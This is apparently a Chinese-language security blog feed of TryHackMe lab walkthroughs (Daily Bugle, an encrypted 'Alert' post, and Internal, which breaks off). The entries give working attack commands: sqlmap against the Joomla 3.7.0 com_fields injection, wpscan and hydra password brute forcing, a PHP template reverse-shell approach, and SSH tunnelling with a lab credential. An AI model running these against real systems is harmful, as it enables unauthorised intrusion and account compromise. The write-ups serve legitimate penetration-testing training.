    
    
    <entry>
      <title>thm-dailybugle</title>
      <link href="/2024/11/24/dailybugle/"/>
      <url>/2024/11/24/dailybugle/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>通过 SQLi 入侵 Joomla CMS 帐户，练习破解哈希并利用 yum 提升您的权限。</p></blockquote><h2 id="靶场概述"><a href="#靶场概述" class="headerlink" title="靶场概述"></a>靶场概述</h2><p>难度： hard<br>描述： sql注入到webshell 到提权的经典案例</p><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.220.38</td></tr><tr><td>OS</td><td>kali</td><td></td></tr></tbody></table><hr><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>端口扫描<br><a href="/../assets/img/Pasted%20image%2020241124214443.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124214443.png"></a></p><h2 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h2><p><a href="/../assets/img/Pasted%20image%2020241124215418.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124215418.png"></a><br><a href="/../assets/img/Pasted%20image%2020241124215640.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124215640.png"></a></p><p>使用joomscan针对目标站点进行扫描，joomscan是一个专门用于扫描Joomla CMS的工具</p><p>可以获取指定版本</p><p><a href="/../assets/img/Pasted%20image%2020241124220358.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124220358.png"></a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code> Joomla! 3.7.0 - &#39;com_fields&#39; SQL Injection</code></pre><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure><p>这里提到了 SQLMap 来利用这个漏洞。但是应该有另一种 Python 替代方案，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/XiphosResearch/exploits/refs/heads/master/Joomblah/joomblah.py</span><br></pre></td></tr></table></figure><p>如果保存需要报错处修改为utf-8编码<br><a href="/../assets/img/Pasted%20image%2020241124220903.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124220903.png"></a><br><a href="/../assets/img/Pasted%20image%2020241124221044.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124221044.png"></a></p><p>登录后考虑进一步利用</p><p><a href="/../assets/img/Pasted%20image%2020241124221148.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124221148.png"></a></p><p>发现在一个模板出可以进行替换<br><a href="/../assets/img/Pasted%20image%2020241124221354.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124221354.png"></a></p><p>考虑反弹shell</p><p><a href="/../assets/img/Pasted%20image%2020241124221842.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124221842.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241124222026.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124222026.png"></a></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>让我们尝试检查此用户的 sudo 权限<br>没有权限运行 ‘sudo -l’，所以让我们试着检查 crontab，看看我们是否有东西要升级到 jjameson 用户：<br><a href="/../assets/img/Pasted%20image%2020241124222313.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124222313.png"></a><br><a href="/../assets/img/Pasted%20image%2020241124222451.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124222451.png"></a></p><p>也什么都没有。所以我们需要进行内部枚举，以便检查一些权限提升向量。在检查了一些目录和文件后，我前往 website 目录检查了配置文件：<br><a href="/../assets/img/Pasted%20image%2020241124222650.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124222650.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241124222823.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124222823.png"></a><br>好吧，它们对 root 用户没有用，但也许我们可以将它们与 jjameson 用户一起使用：</p><p><a href="/../assets/img/Pasted%20image%2020241124222915.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124222915.png"></a><br><a href="/../assets/img/Pasted%20image%2020241124222832.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124222832.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241124223126.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124223126.png"></a><br>gofobins提权<br><a href="/../assets/img/Pasted%20image%2020241124223229.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124223229.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241124223726.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241124223726.png"></a></p><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Alert</title>
      <link href="/2024/11/24/Alert/"/>
      <url>/2024/11/24/Alert/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="74e9b022f014617db71dea8efb2f668c5ace1666ba363ddca753079ab26f0405">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f2596cfa05d5c23a0f4608234a2ac5d4a269982f835407719b76a076bdb08aa9b76ab948607a5fdba5e7da14f5e975ecd50101a9e2712642a5f3784eea922c129e7eee76e8ac4153bf703eec04af192241d2e173f016287ccc108a288bf6e06756864b086b904b960a3b718f3b88b132af5cd55d08423b0bf332917388e0a809701bcd7c42a6e882ce407da57e0ce2ba0f6462c57cfdcf15ea4058c8ef3afd1d2193909bd33613da2bf187777498b397653201d210a28325f72b5090bcd8d66f948852cd9a3f36b4d334c71396e1b0b24109643d8d40c19f119651839a47c192b804387aa541031fcd67aa765416907abff67abaacc352d182f1c435ff60ec59b07a8e0e17a54b5bcd990273f07b95ee68095d3966f244411e20df6080aa0bca5575bb3504e7c3039895c07711c57ef4f5f00f25ed8b693b4df1fa14907bea062cf1424691ea58ac7139b32aae2dc90ec9b685e36818c4b23ac799327956dffe78b9b9fd18af45bacdc14490ec8b95c8e01f5ec2aa1ed2181f851f07441be1291914f92bc3767983fc23be2e22629b49f54d4ce7efb61794c74e1825cc1354a137eeceb5ed0dac60b0892299850a58dd19b2e5a132bbf61aa076dbb6a2859255685bb5cb8af1ae27a8d86fe279135133cae5366bee26ed376449da85306e822ca16fb33f0cdf028e64f5a3d95e8f5d077782d8fc63b2f428d5b300fce46393958ec01c9ff90d370a0eaddfa1287ed64e85a56afbb8101da74969f200b3be335f1e969be46319367c081f6e4f94ed54bc679db25b60916d3ea78ca6aa28720e9b4c15fbb5cb087ecccd5649141da8a91c52b4505ab499cccf027d8540929db01561130d2ea36bddd1dd501ea9507942379aa1e01c75ca4bbef9be80365991714aa1b5fe5957f055a9894d04af6b6140cdd2d5f5b2260c0c6d59922ce95669d75936b0f0bf56d955022c228e5a18ebb056768ab46dd003d54e90b2cdaf1e245ff71180ff1f205addf576aa3a8f8d6bde40d12f0cd930b84702d6b8e3c3c8aad9fec1e1c304d4ae145948c77b35bc1bfae4e03c424b0b08c2a542c4a5b4f389633f58f3a49ba446f32a56d6df6605d2b18c5dd928165242d84066975cbdde7d43c434d63d99317c78b8ad3a4db6d0abb07504840dbbec0e0c5d8e2648062ad6f8ced6cba38da28a711c7533cd560bbef38171bc190e1d6ea52da6f02325430bd65c2e8ccb4dc282f6c697d8d805ffab7d1e3b9e84c6d2678e095d1f46791fbefc43a6c24566be660b22f176b79cc73b63888c177ba84805be2bcd2aeb41a2c8f28135646c33e3dbb8e777e77d44c828f6cd1c4d2b0c41d3cef31c20f678ba3a446d55814cf120f10edb832f17dfc0a1fe747605ac1de231d172005de79060459c5a4614245f10934309a1ec9d2435f8f88b27814e87f436bd166b2fcc35d5fb96a6c47157faf27ac00a91c495427a8f40fdebeb5dae6775ab5e6e4d110b2260ab37ad8742e5d3cdcd6b324f192e80201319799f29dbc6e5cd1feee2de3f3db4f71c33423db7292c8ce24ff1321bdbda0a2da09fc63c268edd13e8019b787f3348bb7c7898302755aa8fc43804378d8b510e36a2accc03794b86566185658b840d59c84390aa54b4f63a2a0f6ee291cb480da2885689dc99d1e367a89ca9e796f91431374b43d8dd850dd5097beb47018a6089454103e39f981c8bfc2f32e85c97e413f636a3011f0fe498f97228ea7b5eab54753df3843a78eed8d5f63c21db1a0afc2d6bbd79dfff242c8be059b9b998fb268d84e78291cf94577f681a09ba4fcc691a3a0be5afe5268a35ab62c4770a5f1e14d019d2c015dc6da5b911bf0cbf97576454594c20d8910580437b1fb72ec46b02fa04dacd1b55e8b91618b8863f70a1a98ec4efaf51e9b75f945fc75558441711a30931a0123e0a277a64588f51ee5c9db4f48871bc2e844e0a94fcc1b344da9d91ef2df83b1c42a8de8d59047e503b581b81adb991a20daab99009a90cb4bf279a1558d2586a4f6eeb293be7b1bac6117984d9b9b0a8febd121110ccbc1592eab04fa5b150e0c1b1b8c0b703fe0b9be9de9452966788afd2ab958330cd6d789d5cdfba413eae9a50f9d8814c51b87664189876816630d5af03591584bf6dd3ea5e59b98359d87f68ccb84e8c21d90d4f8b09f3630aa794a53a4e9be2630aad6d88d03ae5157dd68369079490b90095b9ee1619602a6aa2e4a711660f6b04d5362389f3a1f02b7008a01fcb53c9b97411c51f9fe6c097ff6d80d09d205bf0687fde9f98edd7bdaa9d540af1274720118317501524f9aa440ddcbd1046d4f0a754a77301e8d335f52fed5b00f3e75c29819eee89dd3c1911d6352fed70e527e0c9573dabe88a427910c67650c21dd7385d27cb0a2ce5390af16bd78738ff6eeca89b72526edb5d83bfbe28c134ec42501043ead6a32cd2bb5e0670ea4632709869ef44f46c81de028320e67df28956b754d9174f8f6e5fc48dc2bf189494e623c54653f53162005a721fb6893f7b8042c7d3e56aa14aa58d716ad0655edd1f724e18a425d3f6c159c0b0cf3b2f399db09cfa6baadfbc6460e3531f5e6f096f280a74908caec10a646417703f40e374a398f10ea07598f79b3783c25209f229fcb0957676c8992727363c1bd4e3556a4df7516e2ebe30b35fe16bc8a877af0b27af5b1f01e3477afe83c541f9a463e3ead8958409b0dd84feb91cbcbf7f75b9acc1f177ad6c0705feff16c500ced59eb98e37ee2b10f484689ad1e7d00bbbaab4c7473c07a6e20e5c86ca5ad3bb2895ef817f113d02875360991750ba38113295468d2ec047dbca4c6a493863b207ed9e568351219a83da37748bbae63fd937bb0c77bf8aad9e083866a40cef0b03e4111cc074c4cc12adf81f71f485c75ab69efd30c2f822d1ce1d548828856b99ebd599492cf989483163b9b20faebcad38745f2429179958b33a5909a3b2c173ef8a2dcbfe1a2c9029dbb627ae9763605263cc0c6f4cd70ed2e82928e5005d4d536e3db2e63b00aca08ce4e6a621b0b796b64ca6f30443b366f6d2146f467d423ef21b92034f733a36091528058edde2b98b974d90b045e4885701372534e58de8c885c1a67942dbf23b993f8857ea701f51f08738a98ab16222d6737a20cc66ee8f77968b2558ee0f54a5c2367d5a1ab525fdbffe904a9861614a10f244b259c63c2cd0e765d16fd887dc23212709415c1eec9f1886b222ac8b3d35686a6fda96707640966c28e02aa8e4e79702ce68a8b91f9e0cf94bbbfc7490860198c9608a0b0bab921d6643831a3c1999742cfc7bdbf142297ff31829d4053c3616da9bb3e0d73a94ecc6798c4e2c06c98d6930bb8cb75963d91798ab76812d539e15de9df08eb87914db312d6800265abadceddaecd7eaa2e7c7e3ceb6d3af4e17557cb88e1569b06cf4ec0e013ac9f826c1aabd2fbcb589d6d4446a4d4da660ce5cd16cc6aff45dec883d45fcec95197949de9fa4747ec545726bbcc1475c34aee3e90e4372a9823595f88fbc56b3304f02b9782464b5017156e18b2028fb5a7c8f406d248b1426ba37a00c839165fa83a97214980ce13051ba8dc34d29fe1d29bf7ae19e9bd6a4792ca012869e0546c4fb3f31a6f78ff5907e0f869dd9aa72e663b53211fbc6ffa97259030e032d452af6cf9a32c25c47d17bc1d18b678dbdbac185ed900e40459bb410aca887b0b1d3a4a1cda357416d19fb993b387cbcd8778e4c19a53f40e617b01c3879573542e90870a6e7002639daf664e1f71eabca0ad91c4a8549b7415f75d58f512961cc688ae2a29a58f061b90c3ee6c570d3227ba696ae0c7f004e0b88d5ce0d0fa5ee64b9133bbd2fe70314be01c23702ca5da49398bd4cd7b27081dbc313233563269dc71af9889897680cbd5cf2fb7aa85fef8d5c704e17fc1fa5c1e8c56e3c719f5b3a6d613d84da92453b6ae3569b0eff743d98f07c073d74b9a83adb34436557309ea9ee522e104eb4f255c66658ad873fd4bc16935ba64eaa15d32268d3fc29d5f4d0615fd287867fb4a70b5b3a5fa48234bb87289b5c0a0f1e3bffabead34a0ac1638273ae351844e3074edb710b508f274ab85d1931e1cd6c3d05e5f54497e4a279255679e4e5acb288283cc01958c748a96422bc656e03e56e41023f5a8634936cd566ce5b6f8393aff8030b4d3da9bd9f919f1783cf57f889de8b6414348938bbb8fb67ffedebb71196b059b64695ad77373839a75ff1da0e99ef9948e3d560f01128099a085a40614600e6fba7f4703340793df152cbac70befd1c20ca9e2e0d563c3ad1b0efe84534553f49ea1dbab4242574f1c0bf606366ec6706ee026d0671bca4e161d0197649a83779cbaf8aeebce4fd1caee5e3e2c013f1e705c1e92bbb782fd4d7498720788ec93431529828b0378a2dffa0827e56a2c394436e80e93948d007d85b6c14634bb4c5b6d855a94277345fcc3c934ffda206b27d58ba47d512f04323f05f090056b3fbbcb8e8c6ac38a43761bcecc62824351b09d97c3d493f69cf9979832e33e88ac24d26b2188f34a0fee21ceb59277ff090617f0cd5213ff29bbed14eeb9fce92b00668ddc17d66ce5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-internal</title>
      <link href="/2024/11/23/internal/"/>
      <url>/2024/11/23/internal/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>一句话总结：由wordpress到用户信息泄露获取所有权限</p></blockquote><h2 id="靶场概述"><a href="#靶场概述" class="headerlink" title="靶场概述"></a>靶场概述</h2><p>难度： hard<br>描述：渗透测试挑战<br>您被分配到一个客户，该客户希望在三周内将环境发布到生产环境中进行渗透测试。</p><p><strong>工作范围</strong></p><p>客户要求工程师对提供的虚拟环境进行外部、Web 应用程序和内部评估。客户要求提供有关评估的最低信息，希望从恶意行为者的眼睛进行参与（黑盒渗透测试）。客户要求您获取两个标记（未提供位置）作为漏洞利用的证据：</p><p>此外，客户还提供了以下范围限额：</p><ul><li>确保修改 hosts 文件以反映 internal.thm</li><li>此项目允许使用任何工具或技术</li><li>找到并记录发现的所有漏洞</li><li>将发现的标记提交到仪表板</li><li>只有分配给计算机的 IP 地址在范围内</li></ul><p>我鼓励您将此挑战视为实际的渗透测试。考虑编写一份报告，包括执行摘要、漏洞和漏洞利用评估以及补救建议，因为这将使您为 eLearnsecurity eCPPT 或在该领域担任渗透测试员的职业做好准备。</p><p>接受项目后，您将获得客户评估环境。保护 User 和 Root 标记，并将其作为漏洞利用证明提交到控制面板。</p><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.244.196</td></tr><tr><td>OS</td><td>kali</td><td>Linux</td></tr></tbody></table><hr><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(leo㉿HACK)-[~/SecLab/internal]</span><br><span class="line">└─$ rustscan -a 10.10.244.196</span><br><span class="line">Open 10.10.244.196:22</span><br><span class="line">Open 10.10.244.196:80</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE REASON</span><br><span class="line">22/tcp open  ssh     syn-ack</span><br><span class="line">80/tcp open  http    syn-ack</span><br></pre></td></tr></table></figure><p>路径探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster -u http://10.10.244.196/</span><br><span class="line"> http://10.10.244.196/phpmyadmin</span><br><span class="line"> http://10.10.244.196/wordpress/wp-admin/</span><br></pre></td></tr></table></figure><h2 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h2><p>以80端口未入口点<br>    有两个cms 以wordpress未入口进行扫描<br>wpsan扫描<br><strong>(1) 基础扫描</strong><br><code>wpscan --url https://example.com</code><br><strong>（2）枚举用户和插件</strong></p><p><code>wpscan --url https://example.com --enumerate u,p</code></p><p><strong>（3）使用代理进行扫描</strong></p><p><code>wpscan --url https://example.com --proxy http://127.0.0.1:8080</code></p><p><strong>（4）暴力破解管理员账户</strong></p><p><code>wpscan --url https://example.com --passwords passwords.txt --usernames admin --password-attack wp-login</code></p><p><strong>（5）保存扫描结果为 JSON 文件</strong></p><p><code>wpscan --url https://example.com --output results.json --format json</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://internal.thm/blog/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://internal.thm/blog/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;</span><br><span class="line"> |  - http://internal.thm/blog/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Last Updated: 2024-11-12T00:00:00.000Z</span><br><span class="line"> | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.8</span><br><span class="line"> | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 2.3 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: &#x27;Version: 2.3&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating Most Popular Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection</span><br></pre></td></tr></table></figure><p>尝试密码爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://internal.thm/blog/wp-login.php --usernames admin --passwords /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241123183241.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123183241.png"></a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果能修改php文件可以替换后进行反弹shell</p><p><a href="/../assets/img/Pasted%20image%2020241123183430.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123183430.png"></a><br><a href="/../assets/img/Pasted%20image%2020241123183609.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123183609.png"></a></p><p>WordPress站点的大多数主题位于 &#x2F;wp-content&#x2F; 目录下，主题相关内容则位于 &#x2F;wp-content&#x2F;themes&#x2F; 目录下；根据我们之前所修改文件对应的主题名称，可知404.php文件位置为：&#x2F;wp-content&#x2F;themes&#x2F;twentyseventeen&#x2F;404.php 。（由之前的WPScan扫描结果也可知过时的主题相关页面url）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241123184239.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123184239.png"></a></p><p>升级为tty</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c &quot;import pty;pty.spawn(&#x27;bash&#x27;);</span><br></pre></td></tr></table></figure><p>我们继续使用刚才的初始shell界面进行探索，尝试进一步列举文件和目录信息，最终在&#x2F;opt目录下发现了一个文件wp-save.txt–内容包含了用户名aubreanna及其登录凭据。</p><p><a href="/../assets/img/Pasted%20image%2020241123184539.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123184539.png"></a></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a href="/../assets/img/Pasted%20image%2020241123184713.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123184713.png"></a><br>由于目标机器的端口<code>8080</code>只能通过目标机的本地进行访问，所以我们需要设置SSH本地端口转发，从而将目标机器<code>8080</code>端口上的流量重定向到我们本地攻击机上的地址和端口<code>localhost:4567</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 4567:172.17.0.2:8080 aubreanna@internal.thm</span><br><span class="line">#根据前述结果，登录密码为：bubb13guM!@#123</span><br><span class="line">#ssh端口转发(本地网卡地址0.0.0.0可省略)：HostB$ ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC</span><br><span class="line">#参数说明</span><br><span class="line">#-C：压缩数据</span><br><span class="line">#-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。</span><br><span class="line">#-N ：不执行脚本或命令，通常与-f连用。</span><br><span class="line">#-g ：在-L/-R/-D参数中，允许远程主机连接到建立转发的端口，如果不加这个参数，只允许本地主机建立连接。</span><br><span class="line">#-L : 本地隧道，本地端口:目标IP:目标端口</span><br><span class="line">#-D : 动态端口转发</span><br><span class="line">#-R : 远程隧道</span><br><span class="line">#-T ：不分配 TTY 只做代理用</span><br><span class="line">#-q ：安静模式，不输出 错误/警告 信息</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241123185302.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123185302.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241123185213.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123185213.png"></a></p><p>我们接下来对该jenkins后台登录页面进行暴力破解，在此我们使用hydra工具，我们还需要获取关于登录框的请求表单数据来为hydra相关命令构造参数。</p><p><a href="/../assets/img/Pasted%20image%2020241123185425.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123185425.png"></a><br>通过暴力破解获取到登录密码后，我们可以登录到jenkins后台，然后利用后台中的脚本控制面板写入<a 